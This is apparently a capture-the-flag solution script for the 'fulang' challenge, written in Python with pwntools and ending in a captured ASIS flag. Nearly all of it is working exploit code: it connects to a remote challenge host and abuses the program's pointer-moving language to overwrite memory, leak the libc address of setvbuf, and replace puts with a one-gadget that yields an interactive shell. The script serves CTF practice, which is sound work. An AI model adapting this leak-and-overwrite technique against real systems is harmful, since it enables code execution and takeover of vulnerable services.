#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *   # pip install pwntools

elf = ELF("./fulang")
libc = ELF("./libc6-i386_2.23-0ubuntu7_amd64.so")
r = remote("69.90.132.40", 4001)
#r = process("./fulang", env={"LD_PRELOAD": "./libc6-i386_2.23-0ubuntu7_amd64.so"})

r.recvuntil(":")

offset = (elf.symbols["data"] - elf.symbols["fu"]) 
code = ":<" * offset    # pivot to fu
code += ":."            # overwrite last byte
code += ":::>" * 4      # leak setvbuf
code += ":<" * 12       # pivot to puts
code += ":<:." * 4      # overwrite puts
code += "a"
r.sendline(code)
r.send("\x28")

libc_base = u32(r.recvn(4))- libc.symbols["setvbuf"]
libc_magic = libc_base + 0x5f065
log.info("libc_base = " + hex(libc_base))

r.send(p32(libc_magic)[::-1])

r.interactive()

# ASIS{6f6171bc76b9b7ba4b5e3e00908a8c43}